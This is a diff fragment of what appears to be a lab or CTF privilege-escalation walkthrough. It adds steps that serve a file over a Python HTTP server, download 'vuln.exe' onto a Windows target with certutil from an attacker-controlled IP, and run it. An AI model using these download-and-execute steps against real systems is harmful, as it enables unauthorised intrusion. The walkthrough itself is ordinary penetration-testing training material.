@@ -135,4 +135,25 @@ we are looking for possible vulnerabilities that would allow us to elevate privi
 we are looking for
 ![image](https://github.com/user-attachments/assets/33011923-ceab-430f-bf75-435c7db9d2c6)
 ![image](https://github.com/user-attachments/assets/28b173c4-5065-4b69-947e-de5e760b4722)
+![image](https://github.com/user-attachments/assets/96892089-a286-40dd-8aee-6747d0b77688)
+![image](https://github.com/user-attachments/assets/04e15b23-b430-4aba-a767-6b59f34a5f64)
+![image](https://github.com/user-attachments/assets/0e805a79-7418-4a3a-b0de-823dd9273236)
+
+we enable a server with python to upload our file
+```bash
+python3 -m http.server 80
+```
+![image](https://github.com/user-attachments/assets/45cbc82c-bacb-4e7c-a53e-289d7fb663f5)
+
+```bash
+certutil -urlcache -f http://192.168.1.228/vuln.exe vuln.exe
+```
+![image](https://github.com/user-attachments/assets/4443cf1a-4841-4d11-b08e-7f38a3f492c9)
+
+```bash
+vuln.exe
+```
+![image](https://github.com/user-attachments/assets/0574d4d1-7502-48a4-bf4c-1ea52c8f3948)
+
+
 
